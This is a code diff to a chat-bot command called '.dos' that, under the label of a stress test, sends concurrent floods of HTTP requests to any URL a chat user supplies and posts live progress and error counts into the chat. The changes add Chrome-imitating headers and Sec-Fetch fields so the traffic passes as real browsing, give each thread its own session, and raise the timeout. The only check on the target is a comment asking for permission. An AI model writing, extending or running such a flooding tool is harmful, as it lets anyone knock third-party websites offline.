@@ -1,6 +1,6 @@
 /**
  * DOS Command - Stress test a URL with multiple requests
- * EXACTLY matching the Python script behavior with session persistence
+ * EXACTLY matching the Python script behavior with detailed error logging
  * WARNING: Only use on your own servers or with permission!
  */
 
@@ -15,17 +15,27 @@ const FORCE_AI_MODE = true;
 // Store active test sessions
 const activeTests = new Map();
 
+// Track error types
+const errorTypes = new Map();
+
 // Create a session instance that persists cookies (like Python's requests.get)
 const createSession = () => {
     const session = axios.create({
-        timeout: 2000,
+        timeout: 30000,  // Increased timeout to 30 seconds
         validateStatus: () => true,
+        maxRedirects: 5,
         headers: {
-            'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36',
-            'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8',
-            'Accept-Language': 'en-US,en;q=0.5',
-            'Accept-Encoding': 'gzip, deflate',
-            'Connection': 'keep-alive'
+            'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36',
+            'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8',
+            'Accept-Language': 'en-US,en;q=0.9',
+            'Accept-Encoding': 'gzip, deflate, br',
+            'Connection': 'keep-alive',
+            'Upgrade-Insecure-Requests': '1',
+            'Sec-Fetch-Dest': 'document',
+            'Sec-Fetch-Mode': 'navigate',
+            'Sec-Fetch-Site': 'none',
+            'Sec-Fetch-User': '?1',
+            'Cache-Control': 'max-age=0'
         }
     });
     return session;
@@ -71,8 +81,8 @@ module.exports = {
         }
         
         let url = args[0];
-        let totalRequests = 100;   // Using your test values
-        let threads = 5;           // Using your test values
+        let totalRequests = 100;
+        let threads = 5;
         
         // Parse parameters
         if (args[1] && !isNaN(parseInt(args[1]))) {
@@ -193,8 +203,26 @@ async function startStressTest(sock, chatId, sender, reply, react, targetUrl, to
     let isStopped = false;
     let completedRequests = 0;
     
-    // Create a shared session for this test (cookies persist across requests like Python)
+    // Reset error tracking
+    errorTypes.clear();
+    
+    // Create a shared session for this test
     const sharedSession = createSession();
+    
+    // First, do a single test request to see if URL is accessible
+    console.log(`[DOS] Testing single request to: ${targetUrl}`);
+    try {
+        const testResponse = await sharedSession.get(targetUrl);
+        console.log(`[DOS] Test request - Status: ${testResponse.status}, StatusText: ${testResponse.statusText}`);
+        console.log(`[DOS] Response headers:`, JSON.stringify(testResponse.headers, null, 2));
+    } catch (testError) {
+        console.log(`[DOS] Test request FAILED - Error: ${testError.message}`);
+        if (testError.code) console.log(`[DOS] Error code: ${testError.code}`);
+        if (testError.response) {
+            console.log(`[DOS] Response status: ${testError.response.status}`);
+            console.log(`[DOS] Response data:`, testError.response.data);
+        }
+    }
     
     // Store test info for stopping
     activeTests.set(sender, {
@@ -213,12 +241,15 @@ async function startStressTest(sock, chatId, sender, reply, react, targetUrl, to
                                  `⏳ Progress: 0/${totalRequests} (0%)\n\n` +
                                  `Use \`.dos --stop\` to stop the test.`);
     
-    // Calculate requests per thread (EXACTLY like Python script)
+    // Calculate requests per thread
     const requestsPerThread = Math.floor(totalRequests / threads);
     const remainingRequests = totalRequests - (requestsPerThread * threads);
     
-    // Run threads concurrently (EXACTLY like Python script using threading)
+    // Run threads concurrently
     const runThread = async (threadId, requestCount) => {
+        // Each thread gets its own session (like Python's per-thread requests)
+        const threadSession = createSession();
+        
         for (let i = 0; i < requestCount; i++) {
             // Check if test should stop
             if (activeTests.get(sender)?.stop) {
@@ -227,25 +258,58 @@ async function startStressTest(sock, chatId, sender, reply, react, targetUrl, to
             }
             
             try {
-                // Use the shared session to maintain cookies (like Python's requests.get)
-                const response = await sharedSession.get(targetUrl);
+                const response = await threadSession.get(targetUrl);
                 successCount++;
+                
+                // Log first successful response details
+                if (successCount === 1 && failureCount === 0) {
+                    console.log(`[DOS] First successful response - Status: ${response.status}`);
+                }
             } catch (error) {
                 failureCount++;
+                
+                // Track error types
+                let errorType = error.code || error.message;
+                if (error.response) {
+                    errorType = `HTTP ${error.response.status}`;
+                }
+                errorTypes.set(errorType, (errorTypes.get(errorType) || 0) + 1);
+                
+                // Log first few errors for debugging
+                if (failureCount <= 5) {
+                    console.log(`[DOS] Error #${failureCount}:`, {
+                        message: error.message,
+                        code: error.code,
+                        status: error.response?.status,
+                        statusText: error.response?.statusText
+                    });
+                }
             }
             
             completedRequests++;
             
-            // Update progress (every 10 requests or at completion)
+            // Update progress
             if (completedRequests % 10 === 0 || completedRequests === totalRequests) {
                 const percent = ((completedRequests / totalRequests) * 100).toFixed(1);
+                
+                // Create error summary for progress update
+                let errorSummary = '';
+                if (errorTypes.size > 0) {
+                    const topErrors = Array.from(errorTypes.entries()).slice(0, 3);
+                    errorSummary = '\n\n⚠️ *Top Errors:*\n';
+                    for (const [errType, count] of topErrors) {
+                        errorSummary += `• ${errType}: ${count}\n`;
+                    }
+                }
+                
                 try {
                     await sock.sendMessage(chatId, {
                         text: `⚠️ *STRESS TEST RUNNING*\n\n` +
                               `🎯 Target: \`${targetUrl}\`\n` +
                               `📊 Progress: ${completedRequests}/${totalRequests} (${percent}%)\n` +
                               `✅ Success: ${successCount}\n` +
-                              `❌ Failed: ${failureCount}\n\n` +
+                              `❌ Failed: ${failureCount}\n` +
+                              `${errorSummary}\n` +
                               `Use \`.dos --stop\` to stop the test.`,
                         edit: statusMsg.key
                     });
@@ -254,7 +318,7 @@ async function startStressTest(sock, chatId, sender, reply, react, targetUrl, to
         }
     };
     
-    // Create and run all threads concurrently (EXACTLY like Python)
+    // Create and run all threads concurrently
     const threadPromises = [];
     for (let i = 0; i < threads; i++) {
         let count = requestsPerThread;
@@ -262,7 +326,7 @@ async function startStressTest(sock, chatId, sender, reply, react, targetUrl, to
         threadPromises.push(runThread(i, count));
     }
     
-    // Wait for all threads to finish (EXACTLY like Python's thread.join())
+    // Wait for all threads to finish
     await Promise.all(threadPromises);
     
     const endTime = Date.now();
@@ -272,7 +336,16 @@ async function startStressTest(sock, chatId, sender, reply, react, targetUrl, to
     // Clean up
     activeTests.delete(sender);
     
-    // Send final results (EXACT format like Python)
+    // Build error details
+    let errorDetails = '';
+    if (errorTypes.size > 0) {
+        errorDetails = '\n\n*Error Breakdown:*\n';
+        for (const [errType, count] of errorTypes.entries()) {
+            errorDetails += `• ${errType}: ${count} times\n`;
+        }
+    }
+    
+    // Send final results
     let resultText;
     if (isStopped) {
         resultText = `🛑 *STRESS TEST STOPPED*\n\n` +
@@ -280,7 +353,8 @@ async function startStressTest(sock, chatId, sender, reply, react, targetUrl, to
                     `Total Time: ${duration.toFixed(2)} seconds\n` +
                     `Successful Requests: ${successCount}\n` +
                     `Failed Requests: ${failureCount}\n` +
-                    `Requests Per Second: ${requestsPerSecond}\n\n` +
+                    `Requests Per Second: ${requestsPerSecond}\n` +
+                    `${errorDetails}\n` +
                     `⚠️ Test was stopped by user.`;
     } else {
         resultText = `✅ *STRESS TEST COMPLETED*\n\n` +
@@ -288,7 +362,8 @@ async function startStressTest(sock, chatId, sender, reply, react, targetUrl, to
                     `Total Time: ${duration.toFixed(2)} seconds\n` +
                     `Successful Requests: ${successCount}\n` +
                     `Failed Requests: ${failureCount}\n` +
-                    `Requests Per Second: ${requestsPerSecond}\n\n` +
+                    `Requests Per Second: ${requestsPerSecond}\n` +
+                    `${errorDetails}\n\n` +
                     `> *Powered by ${config.botName}*`;
     }
     
@@ -297,6 +372,7 @@ async function startStressTest(sock, chatId, sender, reply, react, targetUrl, to
     console.log(`[DOS] Successful Requests: ${successCount}`);
     console.log(`[DOS] Failed Requests: ${failureCount}`);
     console.log(`[DOS] Requests Per Second: ${requestsPerSecond}`);
+    console.log(`[DOS] Error Types:`, Object.fromEntries(errorTypes));
     
     await sock.sendMessage(chatId, {
         text: resultText,
